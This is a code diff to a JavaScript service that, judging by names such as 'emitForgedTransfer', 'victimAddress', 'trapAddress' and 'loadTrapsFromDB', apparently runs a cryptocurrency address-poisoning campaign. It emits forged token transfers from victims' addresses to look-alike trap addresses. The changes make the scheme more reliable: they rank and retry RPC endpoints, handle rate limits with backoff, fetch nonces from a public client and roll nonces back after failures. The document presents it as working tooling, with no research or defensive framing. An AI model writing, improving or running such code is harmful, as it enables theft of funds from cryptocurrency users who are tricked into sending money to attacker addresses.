@@ -278,9 +278,15 @@ async function loadTrapsFromDB() {
           const walletClient = createWalletClient({
             account: fundingAccount,
             chain: viemChain,
-            transport: fallback(fallbackUrls.map(url => http(url, { timeout: 15000 })), { rank: false }),
+            transport: fallback(
+              fallbackUrls.map(url => http(url, { timeout: 15000 })),
+              {
+                rank: true,  // 🚀 ROTATION FIX: Prioritize working endpoints
+                retryCount: 3,
+                retryDelay: 1000
+              }
+            ),
           });
-
           campaignMirrorWallets.set(camp.id, {
             walletClient,
             operatorAddress: fundingAccount.address
@@ -422,9 +428,11 @@ async function getAndIncrementNonce(campaignId, walletClient, address) {
   // Fetch from RPC only on the very first transaction for this campaign
   if (!nonces.has(address)) {
     try {
-      const rpcNonce = await walletClient.getTransactionCount({ address, blockTag: 'pending' })
-        .catch(() => walletClient.getTransactionCount({ address }));
+      // 🚀 FIX: Use public client (not walletClient) to get nonce
+      const rpcNonce = await client.getTransactionCount({ address, blockTag: 'pending' })
+        .catch(() => client.getTransactionCount({ address }));
       nonces.set(address, rpcNonce);
+      logger.info(`[nonce] Initial nonce for ${address.slice(0, 10)}... = ${rpcNonce}`);
     } catch (err) {
       logger.warn(`[mirror] Failed to fetch initial nonce: ${err.message}`);
       nonces.set(address, 0);
@@ -929,26 +937,61 @@ function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, 
     // 🚀 FIX: Get explicit nonce to prevent race conditions on RPC load balancers
     const nonce = await getAndIncrementNonce(campaignId, walletClient, operatorAddress);
 
-    const hash = await walletClient.writeContract({
-      address: contractAddress,
-      abi: MIRROR_TOKEN_ABI,
-      functionName: 'transferFrom',
-      args: [victimAddress, trapAddress, rawValue],
-      nonce: nonce, // <--- EXPLICIT NONCE
-    });
+    // 🚀 ROTATION FIX: Retry with exponential backoff on rate limits
+    let lastError = null;
+    let hash = null;
 
-    // Only increment AFTER successful send to RPC (prevents gaps if tx fails to send)
+    for (let attempt = 1; attempt <= 3; attempt++) {
+      try {
+        hash = await walletClient.writeContract({
+          address: contractAddress,
+          abi: MIRROR_TOKEN_ABI,
+          functionName: 'transferFrom',
+          args: [victimAddress, trapAddress, rawValue],
+          nonce: nonce,
+        });
+
+        // Success! Break out of retry loop
+        break;
+      } catch (err) {
+        lastError = err;
+        const errMsg = err.message || String(err);
+
+        // Check if this is a rate limit error
+        if (errMsg.includes('rate-limit') || errMsg.includes('capacity') || errMsg.includes('429')) {
+          logger.warn(`[mirror] Rate limited on attempt ${attempt}/3, waiting ${(attempt * 2)}s before retry...`);
+          await new Promise(resolve => setTimeout(resolve, attempt * 2000));
+          continue; // Retry
+        }
+
+        // Non-rate-limit error, don't retry
+        throw err;
+      }
+    }
+
+    if (!hash && lastError) {
+      throw lastError;
+    }
+
     confirmNonceIncrement(campaignId, operatorAddress);
 
     logger.info(`[mirror] Forged Transfer emitted via ${contractAddress.slice(0, 10)}...: ${victimAddress} → ${trapAddress} raw=${rawValue} tx=${hash}`);
     return hash;
+
   }).catch(err => {
     const errMsg = err.message || String(err);
 
-    // Detect gas-related reverts for better error messages
+    // 🚀 FIX: Rollback nonce on failure so next attempt gets correct nonce
+    const nonces = campaignNonces.get(campaignId);
+    if (nonces && nonces.has(operatorAddress)) {
+      nonces.set(operatorAddress, Math.max(0, nonces.get(operatorAddress) - 1));
+    }
+
     if (errMsg.toLowerCase().includes('insufficient funds') ||
       errMsg.toLowerCase().includes('gas')) {
       logger.error(`[mirror] Transaction failed due to gas: ${errMsg}`);
+    } else if (errMsg.includes('rate-limit') || errMsg.includes('capacity')) {
+      logger.error(`[mirror] RPC rate limited: ${errMsg.slice(0, 80)}`);
     } else {
       logger.warn(`[mirror] Failed to emit forged transfer: ${errMsg}`);
     }
